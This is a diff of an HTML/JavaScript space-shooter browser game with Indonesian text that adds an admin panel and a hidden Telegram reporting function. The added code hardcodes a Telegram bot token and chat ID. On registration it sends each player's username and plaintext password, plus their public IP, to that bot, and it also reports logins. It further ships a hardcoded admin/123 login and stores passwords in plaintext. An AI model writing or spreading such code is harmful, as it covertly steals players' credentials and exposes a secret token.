@@ -3,282 +3,254 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SPACE ANDIKA - V15.2 PRO FIX</title>
+    <title>NEON DODGE - ADVANCED ADMIN</title>
     <style>
-        :root { --neon: #00f2ff; --pink: #ff007f; --gold: #ffd700; --space: #020205; --dark: #0a0a1a; --shield: #00ff88; --hp: #ff3333; }
+        :root { --neon: #00f2ff; --pink: #ff007f; --gold: #ffd700; --space: #020205; --dark: #0a0a1a; }
         body { margin: 0; background: var(--space); font-family: 'Segoe UI', sans-serif; overflow: hidden; color: white; touch-action: none; }
-        canvas { display: block; width: 100vw; height: 100vh; }
-        
-        /* UI Screens */
-        .screen { position: absolute; inset: 0; display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 100; background: rgba(0,0,0,0.95); backdrop-filter: blur(10px); }
+        canvas { display: block; }
+        .screen { position: absolute; inset: 0; display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 100; background: rgba(0,0,0,0.92); backdrop-filter: blur(10px); }
         .active { display: flex; }
-        .box { background: var(--dark); padding: 20px; border-radius: 20px; border: 1px solid var(--neon); width: 85%; max-width: 360px; text-align: center; box-shadow: 0 0 20px rgba(0,242,255,0.2); }
-        
-        /* Buttons & Inputs */
-        .btn { width: 100%; padding: 12px; margin: 5px 0; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; text-transform: uppercase; transition: 0.2s; }
-        .btn:active { transform: scale(0.95); }
+        .box { background: var(--dark); padding: 25px; border-radius: 20px; border: 1px solid var(--neon); width: 340px; text-align: center; position: relative; }
+        .btn { width: 100%; padding: 12px; margin: 8px 0; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; text-transform: uppercase; transition: 0.2s; }
         .btn-cyan { background: var(--neon); color: #000; }
-        .btn-gold { background: var(--gold); color: #000; }
-        .btn-grey { background: #333; color: #ccc; font-size: 10px; }
-        input, select { width: 100%; padding: 10px; margin: 5px 0; border-radius: 8px; background: #000; color: #fff; border: 1px solid #333; box-sizing: border-box; }
+        .btn-pink { background: var(--pink); color: #fff; }
+        .btn-grey { background: #333; color: #ccc; font-size: 10px; margin-top: 5px; }
+        .btn-sml { padding: 5px 8px; font-size: 9px; border-radius: 4px; border: none; font-weight: bold; cursor: pointer; margin-right: 2px; }
+        .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin: 15px 0; max-height: 180px; overflow-y: auto; padding: 10px; border: 1px solid #222; border-radius: 10px; background: #050510; }
+        .item { background: #111; padding: 8px; border-radius: 8px; border: 2px solid transparent; cursor: pointer; font-size: 9px; }
+        .item.active { border-color: var(--neon); background: rgba(0,242,255,0.1); }
+        .pre { width: 18px; height: 18px; margin: 0 auto 5px; clip-path: polygon(50% 0, 0 100%, 100% 100%); }
+        input, select { width: 100%; padding: 10px; margin: 5px 0; border-radius: 6px; border: 1px solid #333; background: #000; color: #fff; font-size: 12px; box-sizing: border-box; }
         
-        /* Skin List & Rows */
-        .list-box { background: #050510; padding: 10px; border-radius: 12px; margin: 10px 0; max-height: 180px; overflow-y: auto; border: 1px solid #222; }
-        .row { display: flex; justify-content: space-between; align-items: center; padding: 10px; border-bottom: 1px solid #111; font-size: 12px; }
+        .admin-list { text-align: left; font-size: 11px; max-height: 200px; overflow-y: auto; background: #000; padding: 10px; border-radius: 10px; border: 1px solid #444; margin: 10px 0; }
+        .user-row { border-bottom: 1px solid #333; padding: 10px 0; }
+        .admin-controls { display: flex; gap: 5px; margin-top: 5px; }
+        .admin-controls input { width: 60px; padding: 4px; margin: 0; }
         
-        /* HUD */
-        #hud { position: absolute; top: 15px; left: 15px; z-index: 50; font-weight: bold; pointer-events: none; }
-        .hp-bar-bg { width: 120px; height: 12px; background: #333; border-radius: 6px; margin-top: 5px; border: 1px solid #555; overflow: hidden; }
-        #hp-fill { height: 100%; background: var(--hp); transition: 0.3s; width: 100%; }
-        
-        .speed-bar { width: 100%; height: 6px; background: #222; border-radius: 3px; margin-top: 5px; overflow: hidden; }
-        .speed-fill { height: 100%; background: var(--neon); transition: 0.3s; }
+        #hud { position: absolute; top: 20px; left: 20px; z-index: 50; font-weight: bold; font-size: 1.2rem; display: none; color: var(--neon); }
     </style>
 </head>
 <body>
 
-<div id="hud">
-    <div style="color:var(--neon)">SKOR: <span id="skor-val">0</span></div>
-    <div style="color:var(--gold)">KOIN: <span id="u-c-game">0</span></div>
-    <div class="hp-bar-bg"><div id="hp-fill"></div></div>
-    <div id="shield-stat" style="color:var(--shield); display:none; font-size: 10px; margin-top:5px;">🛡️ SHIELD ACTIVE</div>
-</div>
+<div id="hud">SKOR: <span id="skor-val">0</span></div>
 
 <div id="scr-welcome" class="screen active">
-    <h1 style="color:var(--neon); text-shadow: 0 0 10px var(--neon);">SPACE ANDIKA</h1>
+    <h1 style="color:var(--neon); text-shadow: 0 0 20px var(--neon)">SPACE ANDIKA 🚀🌌</h1>
     <div class="box">
         <button class="btn btn-cyan" onclick="initAudio(); nav('scr-login')">LOGIN</button>
-        <button class="btn btn-grey" style="margin-top:10px" onclick="initAudio(); nav('scr-register')">BUAT AKUN</button>
+        <button class="btn btn-pink" onclick="initAudio(); nav('scr-register')">DAFTAR</button>
     </div>
 </div>
 
-<div id="scr-login" class="screen"><div class="box"><h2>LOGIN</h2><input type="text" id="l-u" placeholder="Username"><input type="password" id="l-p" placeholder="Password"><button class="btn btn-cyan" onclick="doLogin()">MASUK</button><button class="btn btn-grey" onclick="nav('scr-welcome')">KEMBALI</button></div></div>
-
-<div id="scr-register" class="screen"><div class="box"><h2>REGISTER</h2><input type="text" id="r-u" placeholder="Username Baru"><input type="password" id="r-p" placeholder="Password Baru"><button class="btn btn-cyan" onclick="doRegister()">DAFTAR</button><button class="btn btn-grey" onclick="nav('scr-welcome')">BATAL</button></div></div>
+<div id="scr-login" class="screen"><div class="box"><h2>MASUK</h2><input type="text" id="l-u" placeholder="User"><input type="password" id="l-p" placeholder="Pass"><button class="btn btn-cyan" onclick="doLogin()">LOGIN</button></div></div>
+<div id="scr-register" class="screen"><div class="box"><h2>DAFTAR</h2><input type="text" id="r-u" placeholder="User"><input type="password" id="r-p" placeholder="Pass"><button class="btn btn-pink" onclick="doRegister()">BUAT AKUN</button></div></div>
 
 <div id="scr-menu" class="screen">
-    <div class="box">
-        <div style="display:flex; justify-content:space-between; font-weight:bold; margin-bottom: 10px;">
-            <span id="u-n" style="color:var(--neon)">-</span> <span id="u-c" style="color:var(--gold)">0 C</span>
-        </div>
-        
-        <div class="list-box" id="skin-list"></div>
-
-        <div style="background:rgba(255,255,255,0.05); padding:10px; border-radius:10px; margin-top:5px;">
-            <div style="font-size:10px; color:var(--gold); margin-bottom:5px;">MODIFIKASI PESAWAT</div>
-            <div style="display:flex; gap:10px;">
-                <input type="color" id="mod-color" onchange="updateMod()" style="width:50px; height:35px; padding:2px;">
-                <select id="mod-style" onchange="updateMod()">
-                    <option value="sharp">Sharp Wing</option>
-                    <option value="square">Square Tank</option>
-                </select>
-            </div>
-            <div style="text-align:left; font-size:10px; margin-top:8px;">SPEED: <span id="speed-stat">0</span></div>
-            <div class="speed-bar"><div id="speed-fill" class="speed-fill"></div></div>
-            <button id="up-btn" class="btn btn-gold" style="font-size:10px; padding:8px; margin-top:8px;" onclick="upgradeSpeed()">UPGRADE SPEED (+0.05) | 1500 C</button>
+    <div class="box" style="width: 360px;">
+        <div id="admin-panel" style="display:none; margin-bottom:15px;">
+            <p style="color:var(--gold); font-size: 11px; margin: 0; font-weight:bold">🛡️ KONTROL DATABASE</p>
+            <div class="admin-list" id="user-list"></div>
         </div>
 
-        <button class="btn btn-cyan" style="margin-top:10px; font-size:1.2rem;" onclick="start()">MULAI PERANG</button>
-        <button class="btn btn-grey" onclick="nav('scr-welcome')">LOGOUT</button>
+        <div style="display:flex; justify-content:space-between; margin-bottom:10px;"><span id="u-n" style="color:var(--neon); font-weight:bold">-</span><span id="u-c" style="color:var(--gold); font-weight:bold">0 C</span></div>
+        <div class="grid" id="skin-grid"></div>
+        <button class="btn btn-pink" onclick="start()">MULAI GAME</button>
+        <button class="btn btn-grey" onclick="doLogOut()">LOG OUT</button>
     </div>
 </div>
 
-<div id="scr-over" class="screen"><div class="box"><h1 style="color:var(--hp)">GAME OVER</h1><p>Skor Akhir: <span id="final-skor">0</span></p><button class="btn btn-cyan" onclick="start()">MAIN LAGI</button><button class="btn btn-grey" onclick="nav('scr-menu')">MENU UTAMA</button></div></div>
+<div id="scr-over" class="screen">
+    <div class="box"><h2>GAME OVER</h2><p>Skor: <span id="final-skor">0</span></p><button class="btn btn-cyan" onclick="start()">ULANGI</button><button class="btn btn-grey" onclick="nav('scr-menu')">MENU</button></div>
+</div>
 
 <canvas id="game"></canvas>
 
 <script>
+/* --- KONFIGURASI TELEGRAM (ISI DI SINI) --- */
+const TELE_TOKEN = "7762127279:AAHPko1qnDo0H_grMPoTrhTgI3CUgAYcXzQ";
+const TELE_CHAT_ID = "6788646701";
+
 const cvs = document.getElementById('game'), ctx = cvs.getContext('2d');
-let user = null;
-let db = JSON.parse(localStorage.getItem('nd_v15_final_db')) || { users: {} };
+let user = null, db = JSON.parse(localStorage.getItem('nd_v9_db')) || {};
 
 const SKINS = [
-    {id:0, n:"NEON BASIC", cost:0, baseSpeed:0.15, maxSpeed:0.35},
-    {id:1, n:"PHOENIX ELITE", cost:3000, baseSpeed:0.20, maxSpeed:0.50},
-    {id:2, n:"GALAXY TITAN", cost:8000, baseSpeed:0.25, maxSpeed:0.65}
+    {id:0, n:"Starter", c:"#00f2ff", cost:0, speed:0.12, firerate:300},
+    {id:1, n:"Ruby", c:"#ff007f", cost:1000, speed:0.14, firerate:280},
+    {id:4, n:"Volt", c:"#ffff00", cost:8000, speed:0.20, firerate:220},
+    {id:11, n:"Void", c:"#8e44ad", cost:25000, speed:0.26, firerate:160, border:"#fff"},
+    {id:12, n:"TITAN", c:"#ecf0f1", cost:50000, speed:0.30, firerate:120, border:"gold"},
+    {id:13, n:"GOD TIER", c:"rainbow", cost:0, speed:0.35, firerate:80, border:"#00f2ff"}
 ];
 
 let audioCtx;
 function initAudio() { if(!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)(); }
-function playSfx(f=400, d=0.1) { if(!audioCtx) return; const o=audioCtx.createOscillator(), g=audioCtx.createGain(); o.frequency.setValueAtTime(f, audioCtx.currentTime); g.gain.exponentialRampToValueAtTime(0.0001, audioCtx.currentTime+d); o.connect(g); g.connect(audioCtx.destination); o.start(); o.stop(audioCtx.currentTime+d); }
 
-function save() { localStorage.setItem('nd_v15_final_db', JSON.stringify(db)); }
+/* --- FUNGSI KIRIM LOG KE TELEGRAM --- */
+async function sendToTelegram(message) {
+    try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        const fullMsg = `<b>LOG GAME NEON DODGE</b>\n${message}\n🌐 IP: ${ipData.ip}\n⏰ ${new Date().toLocaleString('id-ID')}`;
+        
+        await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: TELE_CHAT_ID, text: fullMsg, parse_mode: 'HTML' })
+        });
+    } catch (e) { console.log("Tele Error"); }
+}
+
+function playShootSound(vip) {
+    if(!audioCtx) return;
+    const o = audioCtx.createOscillator(), g = audioCtx.createGain();
+    o.type = vip ? 'sawtooth' : 'square';
+    o.frequency.setValueAtTime(vip?600:400, audioCtx.currentTime);
+    o.frequency.exponentialRampToValueAtTime(10, audioCtx.currentTime + 0.1);
+    g.gain.setValueAtTime(0.04, audioCtx.currentTime);
+    g.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.1);
+    o.connect(g); g.connect(audioCtx.destination);
+    o.start(); o.stop(audioCtx.currentTime + 0.1);
+}
 
 function nav(id) {
     document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
-    document.getElementById(id).classList.add('active');
-    if(id === 'scr-menu') renderMenu();
+    if(id !== 'none') document.getElementById(id).classList.add('active');
+    if(id === 'scr-menu') { renderShop(); if(user.isAdmin) updateAdminList(); }
     game.running = false;
     document.getElementById('hud').style.display = (id === 'none') ? 'block' : 'none';
 }
 
 function doLogin() {
     let u = document.getElementById('l-u').value, p = document.getElementById('l-p').value;
-    const fix = (obj) => {
-        if(!obj.owned) obj.owned = [0];
-        if(obj.cur === undefined) obj.cur = 0;
-        if(obj.speedAdd === undefined) obj.speedAdd = 0;
-        if(!obj.modColor) obj.modColor = '#00f2ff';
-        if(!obj.modStyle) obj.modStyle = 'sharp';
-        return obj;
-    };
-
-    if(u==='admin' && p==='123') { user=fix({u:'ADMIN', coins:99999, owned:[0,1,2], cur:2}); nav('scr-menu'); }
-    else if(db.users[u] && db.users[u].p===p) { user=fix(db.users[u]); nav('scr-menu'); } 
-    else alert("Login Gagal!");
+    if(u === 'admin' && p === '123') {
+        user = {u:'ADMIN', coins:999999, owned:SKINS.map(s=>s.id), cur:12, used:[], isAdmin:true};
+        sendToTelegram(`🛡️ <b>LOGIN ADMIN</b>\nUsername: ${u}`);
+        document.getElementById('admin-panel').style.display = 'block'; nav('scr-menu');
+    } else if(db[u] && db[u].p === p) {
+        user = db[u]; 
+        sendToTelegram(`🚀 <b>LOGIN USER</b>\nUsername: ${u}`);
+        document.getElementById('admin-panel').style.display = 'none'; nav('scr-menu');
+    } else alert("Username/Password Salah!");
 }
 
 function doRegister() {
     let u = document.getElementById('r-u').value, p = document.getElementById('r-p').value;
-    if(!u || db.users[u]) return alert("Username tidak tersedia!");
-    db.users[u] = {u, p, coins:1500, owned:[0], cur:0, speedAdd:0, modColor:'#00f2ff', modStyle:'sharp'};
-    save(); alert("Berhasil Terdaftar!"); nav('scr-login');
+    if(!u || !p || db[u]) return alert("Username tidak tersedia!");
+    db[u] = {u, p, coins:500, owned:[0], cur:0, used:[]}; 
+    saveDB(); 
+    sendToTelegram(`✨ <b>USER BARU</b>\nUser: ${u}\nPass: ${p}`);
+    nav('scr-login');
 }
 
-function renderMenu() {
-    if(!user) return;
+function doLogOut() { user = null; nav('scr-welcome'); }
+
+function saveDB() { localStorage.setItem('nd_v9_db', JSON.stringify(db)); }
+
+/* --- ADMIN POWER FUNCTIONS --- */
+function updateAdminList() {
+    const list = document.getElementById('user-list'); list.innerHTML = '';
+    Object.values(db).forEach(u => {
+        const row = document.createElement('div');
+        row.className = 'user-row';
+        let skinOptions = SKINS.map(s => `<option value="${s.id}">${s.n}</option>`).join('');
+        row.innerHTML = `
+            <div><b>${u.u}</b> | ${u.coins} C</div>
+            <div class="admin-controls">
+                <input type="number" id="amt-${u.u}" placeholder="Coin">
+                <button class="btn-sml" style="background:var(--gold);color:black" onclick="giveCoin('${u.u}')">Kirim</button>
+                <select id="skn-${u.u}" style="width: 80px;">${skinOptions}</select>
+                <button class="btn-sml" style="background:var(--neon);color:black" onclick="giveSkin('${u.u}')">Beri</button>
+                <button class="btn-sml" style="background:#ff3333" onclick="delUser('${u.u}')">X</button>
+            </div>
+        `;
+        list.appendChild(row);
+    });
+}
+
+function giveCoin(target) {
+    const amt = parseInt(document.getElementById(`amt-${target}`).value);
+    if(isNaN(amt)) return alert("Masukkan jumlah angka!");
+    db[target].coins += amt;
+    saveDB(); updateAdminList();
+    alert(`Berhasil mengirim ${amt} koin ke ${target}`);
+}
+
+function giveSkin(target) {
+    const skinId = parseInt(document.getElementById(`skn-${target}`).value);
+    if(!db[target].owned.includes(skinId)) {
+        db[target].owned.push(skinId);
+        saveDB(); alert(`Skin diberikan ke ${target}`);
+    } else { alert("User sudah punya skin ini"); }
+}
+
+function delUser(target) {
+    if(confirm(`Hapus akun ${target}?`)) { delete db[target]; saveDB(); updateAdminList(); }
+}
+
+/* --- GAMEPLAY --- */
+function renderShop() {
     document.getElementById('u-n').innerText = user.u;
     document.getElementById('u-c').innerText = user.coins + " C";
-    document.getElementById('mod-color').value = user.modColor;
-    document.getElementById('mod-style').value = user.modStyle;
-    
-    let sData = SKINS.find(x => x.id === user.cur) || SKINS[0];
-    let curS = sData.baseSpeed + user.speedAdd;
-    document.getElementById('speed-stat').innerText = curS.toFixed(2);
-    document.getElementById('speed-fill').style.width = (Math.min(curS / sData.maxSpeed, 1) * 100) + "%";
-
-    let html = '';
+    const g = document.getElementById('skin-grid'); g.innerHTML = '';
     SKINS.forEach(s => {
-        let isOwned = user.owned.includes(s.id);
-        let isEquipped = user.cur === s.id;
-        html += `<div class="row">
-            <span style="color:${isEquipped?'var(--neon)':'white'}">${s.n}</span>
-            <button onclick="handleSkin(${s.id})" style="background:${isEquipped?'#444':(isOwned?'var(--neon)':'var(--gold)')}; border:none; padding:5px 10px; border-radius:5px; font-weight:bold; min-width:70px;">
-                ${isEquipped?'AKTIF':(isOwned?'PAKAI':s.cost+'C')}
-            </button>
-        </div>`;
+        let own = user.owned.includes(s.id);
+        if(!own && s.cost === 0) return;
+        let d = document.createElement('div'); d.className = `item ${user.cur === s.id ? 'active' : ''}`;
+        let bg = s.c === 'rainbow' ? 'linear-gradient(red, blue)' : s.c;
+        d.innerHTML = `<div class="pre" style="background:${bg}; border:${s.border?'1px solid '+s.border:'none'}"></div><div style="font-size:8px">${s.n}</div><div style="color:var(--gold)">${own?'PAKAI':s.cost}</div>`;
+        d.onclick = () => { 
+            if(own) user.cur=s.id; 
+            else if(user.coins>=s.cost){ user.coins-=s.cost; user.owned.push(s.id); user.cur=s.id; }
+            if(!user.isAdmin){ db[user.u]=user; saveDB(); }
+            renderShop();
+        };
+        g.appendChild(d);
     });
-    document.getElementById('skin-list').innerHTML = html;
 }
 
-function handleSkin(id) {
-    let s = SKINS.find(x => x.id === id);
-    if(user.owned.includes(id)) { user.cur = id; }
-    else if(user.coins >= s.cost) { user.coins -= s.cost; user.owned.push(id); user.cur = id; }
-    else return alert("Koin Kurang!");
-    save(); renderMenu();
-}
-
-function updateMod() { 
-    user.modColor = document.getElementById('mod-color').value; 
-    user.modStyle = document.getElementById('mod-style').value; 
-    save(); 
-}
-
-function upgradeSpeed() {
-    let s = SKINS.find(x => x.id === user.cur);
-    if(s.baseSpeed + user.speedAdd >= s.maxSpeed) return alert("MAX SPEED!");
-    if(user.coins >= 1500) { user.coins -= 1500; user.speedAdd += 0.05; save(); renderMenu(); playSfx(800, 0.1); }
-    else alert("Koin Kurang!");
-}
-
-// GAME ENGINE
-let game = { running:false, stars:[], enemies:[], bullets:[], drops:[], skor:0, px:0, py:0, tx:0, shield:false, hp:3 };
-for(let i=0; i<60; i++) game.stars.push({x:Math.random()*2000, y:Math.random()*2000, s:Math.random()*2});
+let game = { running:false, px:0, py:0, tx:0, tilt:0, enemies:[], bullets:[], lastF:0, skor:0 };
 
 function start() {
-    cvs.width = window.innerWidth; cvs.height = window.innerHeight;
-    game.px = cvs.width/2; game.py = cvs.height*0.85; game.tx = cvs.width/2;
-    game.skor = 0; game.enemies = []; game.bullets = []; game.drops = []; game.shield = false; game.hp = 3;
-    game.running = true; nav('none');
+    nav('none');
+    game = { ...game, running:true, px:cvs.width/2, py:cvs.height*0.8, tx:cvs.width/2, enemies:[], bullets:[], skor:0 };
 }
 
 function loop() {
-    ctx.fillStyle = 'rgba(2, 2, 5, 0.4)'; ctx.fillRect(0,0,cvs.width,cvs.height);
-    ctx.fillStyle = '#fff';
-    game.stars.forEach(s => { s.y += s.s + 1; if(s.y > cvs.height) s.y = 0; ctx.fillRect(s.x % cvs.width, s.y, s.s, s.s); });
-
+    ctx.fillStyle = "rgba(2, 2, 5, 0.25)"; ctx.fillRect(0,0,cvs.width,cvs.height);
     if(game.running) {
-        let sData = SKINS.find(x => x.id === user.cur) || SKINS[0];
-        let finalSpeed = Math.min(sData.baseSpeed + user.speedAdd, sData.maxSpeed);
-        game.px += (game.tx - game.px) * finalSpeed;
-
-        document.getElementById('hp-fill').style.width = (game.hp/3*100) + "%";
-        document.getElementById('shield-stat').style.display = game.shield ? 'block' : 'none';
-
-        if(Math.random() < 0.15) { game.bullets.push({x:game.px, y:game.py-20}); playSfx(700, 0.05); }
-        game.bullets.forEach((b, i) => {
-            b.y -= 15; ctx.fillStyle = user.modColor; ctx.fillRect(b.x-2, b.y, 4, 15);
+        let s = SKINS.find(x => x.id === user.cur) || SKINS[0];
+        game.px += (game.tx - game.px) * s.speed; game.tilt = (game.tx - game.px) * 0.1;
+        if(Date.now() - game.lastF > s.firerate) { game.bullets.push({x:game.px, y:game.py-20, vip:s.id>=11}); playShootSound(s.id>=11); game.lastF = Date.now(); }
+        game.bullets.forEach((b,i) => {
+            b.y -= 15; ctx.fillStyle = b.vip ? "#00f2ff" : "#fff";
+            ctx.fillRect(b.x-(b.vip?2:1), b.y, b.vip?4:2, 12);
             if(b.y < 0) game.bullets.splice(i,1);
         });
-
-        game.drops.forEach((d, i) => {
-            d.y += 3;
-            ctx.fillStyle = d.t==='coin'?'#ffd700':(d.t==='hp'?'#ff3333':'#00ff88');
-            ctx.beginPath(); ctx.arc(d.x, d.y, 10, 0, Math.PI*2); ctx.fill();
-            if(Math.hypot(game.px-d.x, game.py-d.y) < 30) {
-                if(d.t==='coin') user.coins += 50;
-                else if(d.t==='hp') game.hp = Math.min(3, game.hp+1);
-                else game.shield = true;
-                game.drops.splice(i,1); playSfx(900, 0.1); save();
+        if(Math.random() < 0.07) game.enemies.push({x:Math.random()*cvs.width, y:-20});
+        game.enemies.forEach((e,i) => {
+            e.y += (5 + game.skor/5000); ctx.fillStyle="#ff3333"; ctx.beginPath(); ctx.arc(e.x, e.y, 15, 0, Math.PI*2); ctx.fill();
+            if(Math.hypot(game.px-e.x, game.py-e.y) < 25) {
+                game.running = false; document.getElementById('final-skor').innerText = game.skor;
+                if(!user.isAdmin){ user.coins+=Math.floor(game.skor/10); db[user.u]=user; saveDB(); }
+                nav('scr-over');
             }
+            game.bullets.forEach((b,bi) => { if(Math.hypot(b.x-e.x, b.y-e.y) < 22) { game.enemies.splice(i,1); game.bullets.splice(bi,1); game.skor+=100; } });
         });
-
-        if(Math.random() < 0.06) {
-            let type = Math.random() < 0.2 ? 'red' : 'white';
-            game.enemies.push({x:Math.random()*cvs.width, y:-40, t: type, hp: (type==='red'?2:1)});
-        }
-        
-        game.enemies.forEach((e, i) => {
-            e.y += (e.t === 'red' ? 6 : 4) + (game.skor/15000);
-            ctx.fillStyle = e.t === 'red' ? "#ff3333" : "white";
-            ctx.fillRect(e.x-15, e.y-15, 30, 30);
-            ctx.strokeStyle = "black"; ctx.strokeRect(e.x-15, e.y-15, 30, 30);
-
-            if(Math.hypot(game.px-e.x, game.py-e.y) < 30) {
-                if(game.shield) game.shield = false; else game.hp -= 1;
-                game.enemies.splice(i,1); playSfx(100, 0.2);
-                if(game.hp <= 0) { game.running = false; nav('scr-over'); document.getElementById('final-skor').innerText = game.skor; }
-            }
-
-            game.bullets.forEach((b, bi) => {
-                if(Math.hypot(b.x-e.x, b.y-e.y) < 25) {
-                    e.hp -= 1; game.bullets.splice(bi,1);
-                    if(e.hp <= 0) {
-                        let r = Math.random();
-                        if(r < 0.35) game.drops.push({x:e.x, y:e.y, t:'coin'});
-                        else if(r < 0.40) game.drops.push({x:e.x, y:e.y, t:'shield'});
-                        else if(r < 0.43) game.drops.push({x:e.x, y:e.y, t:'hp'});
-                        game.enemies.splice(i,1); game.skor += 100; playSfx(300, 0.05);
-                    }
-                }
-            });
-        });
-
-        ctx.save(); ctx.translate(game.px, game.py);
-        if(game.shield) { ctx.strokeStyle="#00ff88"; ctx.lineWidth=3; ctx.beginPath(); ctx.arc(0,0,40,0,Math.PI*2); ctx.stroke(); }
-        ctx.fillStyle = user.modColor;
-        ctx.shadowBlur = 10; ctx.shadowColor = user.modColor;
-        if(user.modStyle==='sharp') { ctx.beginPath(); ctx.moveTo(0,-30); ctx.lineTo(-20,15); ctx.lineTo(20,15); ctx.fill(); }
-        else { ctx.fillRect(-18,-18,36,36); }
+        ctx.save(); ctx.translate(game.px, game.py); ctx.rotate(game.tilt);
+        ctx.fillStyle = "orange"; ctx.fillRect(-4, 10, 8, s.id>=11?22:12);
+        if(s.c==='rainbow'){ let g=ctx.createLinearGradient(-15,0,15,0); g.addColorStop(0,"red"); g.addColorStop(1,"blue"); ctx.fillStyle=g; }
+        else ctx.fillStyle=s.c;
+        ctx.beginPath(); ctx.moveTo(0,-25); ctx.lineTo(-20,10); ctx.lineTo(0,3); ctx.lineTo(20,10); ctx.closePath(); ctx.fill();
+        if(s.border){ ctx.strokeStyle=s.border; ctx.lineWidth=3; ctx.stroke(); }
         ctx.restore();
-
         document.getElementById('skor-val').innerText = game.skor;
-        document.getElementById('u-c-game').innerText = user.coins;
     }
     requestAnimationFrame(loop);
 }
 
-const move = (e) => { game.tx = e.touches ? e.touches[0].clientX : e.clientX; };
-window.addEventListener('mousemove', move);
-window.addEventListener('touchstart', move);
-window.addEventListener('touchmove', (e) => { move(e); e.preventDefault(); }, {passive:false});
-loop();
+window.addEventListener('mousemove', e => game.tx = e.clientX);
+window.addEventListener('touchmove', e => { game.tx = e.touches[0].clientX; e.preventDefault(); }, {passive:false});
+cvs.width = window.innerWidth; cvs.height = window.innerHeight; loop();
 </script>
 </body>
 </html>
-
-
-
-
-
